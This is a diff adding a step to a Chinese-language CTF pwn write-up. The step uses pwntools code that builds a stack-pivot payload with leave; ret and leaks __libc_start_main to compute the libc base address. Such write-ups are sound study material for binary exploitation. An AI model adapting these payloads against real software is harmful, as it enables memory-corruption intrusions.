@@ -229,7 +229,21 @@ log.success('stack_addr: ' + hex(stack_addr))
 ```
 ![[Pasted image 20250211193005.png]]
 第四步，泄露了stack段后开始着手构造栈迁移来泄漏libc基址。
-
+![[Pasted image 20250211193129.png]]
+查看栈上空间可以发现有__libc_start_main + 128，将栈迁移过去就可以再次利用puts来泄漏。
+```python
+# payload4开始构造栈迁移泄漏libc基址
+payload4 = p64(stack_addr + 0xb0) + p64(func_base + 0x101229) + b'a' * 0x10 + p64(stack_addr - 0x30) + p64(leave_ret) + b'\x00' * 0x8
+p.sendafter(b'berial: ', payload4)
+# payload4已经将栈迁移到位置，payload5泄漏__libc_start_main地址
+payload5 = b'a' * (0x20 - 8 - 1) + b'd'
+p.send(payload5)
+p.recvuntil(b'ad')
+__libc_start_main_add = u64(p.recv(6).ljust(8, b'\x00'))
+__libc_start_main_base = __libc_start_main_add - 128
+log.success('__libc_start_main_add: ' + hex(__libc_start_main_add))
+log.success('__libc_start_main_base: ' + hex(__libc_start_main_base))
+```
 
 ## unjoke
 
